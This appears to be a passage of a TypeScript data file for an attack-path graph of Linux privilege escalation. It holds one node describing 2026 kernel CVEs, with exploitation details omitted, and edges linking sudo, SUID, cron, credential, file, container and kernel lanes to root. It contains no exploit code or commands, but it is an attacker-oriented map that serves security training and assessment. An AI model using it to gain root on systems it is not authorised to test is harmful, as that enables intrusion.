      'A cluster of named Linux LPEs disclosed in 2026 that you should recognise on a version check, listed here for awareness with no exploitation detail. Copy Fail (CVE-2026-31431) is a Dirty-Pipe-class page-cache write primitive in the AF_ALG/AEAD crypto path. Dirty Frag (CVE-2026-43284) is a related page-cache write chain in the xfrm-ESP/RxRPC paths (generally needs CAP_NET_ADMIN). The kernel ptrace LPE (CVE-2026-46333) chains a __ptrace_may_access flaw with pidfd_getfd to steal FDs and read secrets. nf_tables (CVE-2026-23111) is another netfilter use-after-free reachable via unprivileged user namespaces. Match the kernel version and patch level; exploitation specifics are intentionally omitted.',
    requires: ['An unpatched kernel in the affected range (verify against your distro tracker; some paths need CAP_NET_ADMIN or user namespaces)'],
    mitre: mitre('T1068'),
    references: [
      { label: 'NVD, CVE-2026-31431 (Copy Fail)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-31431' },
      { label: 'CERT/CC VU#260001 (Copy Fail)', url: 'https://kb.cert.org/vuls/id/260001' },
      { label: 'CERT/CC VU#980487 (Dirty Frag)', url: 'https://kb.cert.org/vuls/id/980487' },
      { label: 'Qualys, CVE-2026-46333 (kernel ptrace LPE)', url: 'https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path' },
      { label: 'Exodus Intelligence, Off By ! (CVE-2026-23111, nf_tables)', url: 'https://blog.exodusintel.com' },
      { label: 'NVD, CVE-2026-23111 (nf_tables use-after-free)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-23111' },
    ],
    opsec: 'Listed for situational awareness. As with any kernel exploit, a version-matched, tested implementation is essential; a blind attempt risks a panic. Interim mitigations include kernel.yama.ptrace_scope=2 for the ptrace path.',
  },
];

export const linuxPrivescEdges: AttackEdge[] = [
  // Triage hub -> the seven lanes.
  // Split the lanes by the honest Linux axis. Identity-CONFERRED paths (what you already
  // hold) sit under the Identity & Entitlements triage: sudo rights, and privileged group
  // membership (docker/lxd/disk are the group lane inside 'Groups & Containers'). The
  // misconfiguration-HUNT lanes (found by the enumeration sweep) stay under Enumerate & Triage.
  { source: 'lin-enum', target: 'lin-identity' },
  { source: 'lin-identity', target: 'lin-cat-sudo' },
  { source: 'lin-identity', target: 'lin-cat-containers' },
  { source: 'lin-enum', target: 'lin-cat-suid' },
  { source: 'lin-enum', target: 'lin-cat-jobs' },
  { source: 'lin-enum', target: 'lin-cat-creds' },
  { source: 'lin-enum', target: 'lin-cat-files' },
  { source: 'lin-enum', target: 'lin-cat-kernel' },
  // Host controls (SELinux/AppArmor, nosuid/noexec, auditd): a constraint on the lanes,
  // the Linux analog of the Windows Defense Evasion gate. A leaf, not a path to root.
  { source: 'lin-enum', target: 'lin-hostcontrols' },

  // Lane 1: Sudo Abuse
  { source: 'lin-cat-sudo', target: 'lin-sudo-gtfobins' },
  { source: 'lin-cat-sudo', target: 'lin-sudo-env' },
  { source: 'lin-cat-sudo', target: 'lin-sudo-argwild' },
  { source: 'lin-cat-sudo', target: 'lin-sudo-cve' },

  // Lane 2: SUID / SGID & Capabilities
  { source: 'lin-cat-suid', target: 'lin-suid-gtfobins' },
  { source: 'lin-cat-suid', target: 'lin-suid-library' },
  { source: 'lin-cat-suid', target: 'lin-suid-path' },
  { source: 'lin-cat-suid', target: 'lin-caps' },
  { source: 'lin-cat-suid', target: 'lin-suid-custom' },

  // Lane 3: Scheduled Jobs & Services
  { source: 'lin-cat-jobs', target: 'lin-cron-writable' },
  { source: 'lin-cat-jobs', target: 'lin-cron-wildcard' },
  { source: 'lin-cat-jobs', target: 'lin-systemd' },
  { source: 'lin-cat-jobs', target: 'lin-writable-script' },
  { source: 'lin-cat-jobs', target: 'lin-logrotate' },

  // Lane 4: Credentials & Secrets
  { source: 'lin-cat-creds', target: 'lin-cred-hunt' },
  { source: 'lin-cat-creds', target: 'lin-ssh-keys' },
  { source: 'lin-cat-creds', target: 'lin-db-creds' },
  { source: 'lin-cat-creds', target: 'lin-cred-reuse' },
  { source: 'lin-cat-creds', target: 'lin-session-hijack' },

  // Lane 5: Writable Files & Shares
  { source: 'lin-cat-files', target: 'lin-passwd' },
  { source: 'lin-cat-files', target: 'lin-shadow' },
  { source: 'lin-cat-files', target: 'lin-filewrite' },
  { source: 'lin-cat-files', target: 'lin-nfs' },

  // Lane 6: Privileged Groups & Containers
  { source: 'lin-cat-containers', target: 'lin-group-privesc' },
  { source: 'lin-cat-containers', target: 'lin-docker' },
  { source: 'lin-cat-containers', target: 'lin-lxd' },
  { source: 'lin-cat-containers', target: 'lin-container-escape' },
  { source: 'lin-cat-containers', target: 'lin-container-cve' },

  // Lane 7: Kernel & Library Exploits
  { source: 'lin-cat-kernel', target: 'lin-kernel-exploit' },
  { source: 'lin-cat-kernel', target: 'lin-glibc' },
  { source: 'lin-cat-kernel', target: 'lin-polkit' },
  { source: 'lin-cat-kernel', target: 'lin-service-cve' },
  { source: 'lin-cat-kernel', target: 'lin-needrestart' },
  { source: 'lin-cat-kernel', target: 'lin-kernel-recent' },

  // Every technique converges on root.
  { source: 'lin-sudo-gtfobins', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-sudo-env', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-sudo-argwild', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-sudo-cve', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-suid-gtfobins', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-suid-library', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-suid-path', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-caps', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-suid-custom', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-cron-writable', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-cron-wildcard', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-systemd', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-writable-script', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-logrotate', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-cred-hunt', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-ssh-keys', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-db-creds', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-cred-reuse', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-session-hijack', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-passwd', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-shadow', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-filewrite', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-nfs', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-group-privesc', target: 'lin-shadow', label: 'disk/shadow group reads the hashes to crack' },
  { source: 'lin-group-privesc', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-docker', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-lxd', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-container-escape', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-container-cve', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-kernel-exploit', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-glibc', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-polkit', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-service-cve', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-needrestart', target: 'lin-root', rel: 'to-root' },
  { source: 'lin-kernel-recent', target: 'lin-root', rel: 'to-root' },
];
